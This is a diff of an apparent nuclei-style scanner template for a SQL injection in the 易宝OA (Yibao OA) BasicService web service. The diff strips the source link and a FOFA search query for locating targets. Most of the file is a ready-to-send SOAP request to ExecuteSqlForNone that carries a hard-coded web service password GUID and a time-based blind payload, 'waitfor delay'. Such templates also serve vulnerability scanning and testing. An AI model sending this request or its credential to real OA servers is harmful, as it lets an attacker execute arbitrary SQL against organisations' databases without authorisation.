@@ -3,14 +3,8 @@ info:
   name: 易宝OA BasicService SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pgygsb6teggroypv
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pgygsb6teggroypv
-    fofa: app="顶讯科技-易宝OA系统"
 http:
 - raw:
   - "POST /WebService/BasicService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nSOAPAction: \"http://tempuri.org/ExecuteSqlForNone\"\nContent-Length: 85\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <ExecuteSqlForNone xmlns=\"http://tempuri.org/\">\n      <sql>waitfor delay '0:0:5'--+</sql>\n      <strParameters></strParameters>\n      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>\n    </ExecuteSqlForNone>\n  </soap:Body>\n</soap:Envelope>"
